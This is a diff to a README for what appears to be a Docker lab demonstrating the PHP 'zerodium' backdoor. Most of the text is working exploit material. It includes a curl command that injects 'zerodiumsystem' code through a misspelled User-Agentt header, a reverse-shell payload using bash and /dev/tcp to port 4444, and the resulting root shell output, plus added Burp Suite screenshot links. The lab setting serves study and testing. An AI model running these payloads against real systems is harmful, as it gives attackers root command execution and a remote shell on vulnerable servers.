@@ -19,6 +19,9 @@ CONTAINER ID   IMAGE                     COMMAND                  CREATED       
 ```
 runs the service at `http://youripaddress:8080` or `http://0.0.0.0:8080`
 
+![Check on your browser](images/web.png)
+
+
 Command Injection
 ```bash
 $ curl -H "User-Agentt: zerodiumsystem('id');" 'http://172.17.0.1:8080'
@@ -26,9 +29,12 @@ uid=0(root) gid=0(root) groups=0(root)
 
 testing, hello world page
 ```
-Remote Code Execution
+via burp suite
+
+![Command Injection](images/cmdi.png)
+Remote Code Execution using curl
 ```bash
-$ curl -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");" 'http://127.0.0.1:8080'
+$ curl -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");" 'http://172.17.0.1:8080'
 ```
 Output
 ```bash
@@ -45,3 +51,6 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 root@4607c17c5b06:/var/www/html# 
 ```
+via burp suite
+
+![Remote Code Injection](images/rce.png)
